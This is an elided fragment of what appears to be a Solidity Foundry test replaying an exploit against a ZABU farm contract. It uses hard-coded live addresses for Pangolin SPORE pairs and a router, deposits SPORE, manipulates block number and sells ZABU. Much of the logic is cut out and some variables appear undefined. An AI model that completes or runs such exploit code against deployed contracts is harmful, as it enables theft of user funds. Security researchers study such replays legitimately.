...
contract depositToken {
    ...
    IUniswapV2Router Router = IUniswapV2Router(payable(0xE54Ca86531e17Ef3616d22Ca28b0D458b6C89106));
...
contract ContractTest is Test {
    ...
    IUniswapV2Router Router = IUniswapV2Router(payable(0xE54Ca86531e17Ef3616d22Ca28b0D458b6C89106));
    ZABUFarm Farm = ZABUFarm(0xf61b4f980A1F34B55BBF3b2Ef28213Efcc6248C4);
    IUniswapV2Pair PangolinPair1 = IUniswapV2Pair(0x0a63179a8838b5729E79D239940d7e29e40A0116); // SPORE WAVAX
    IUniswapV2Pair PangolinPair2 = IUniswapV2Pair(0xad24a72ffE0466399e6F69b9332022a71408f10b); // SPORE PNG
    ...
    function testExploit() public payable {
        ...
        // depost SPORE
        ContractFactory();
        (bool success2,) = addressContract.call{value: 1 ether}(abi.encodeWithSignature("depositSPORE()"));
        //require(success1);
        require(success4);
        // change block.number
        ...
        (bool success3,) = addressContract.call(abi.encodeWithSignature("sellZABU()"));
        require(success3);
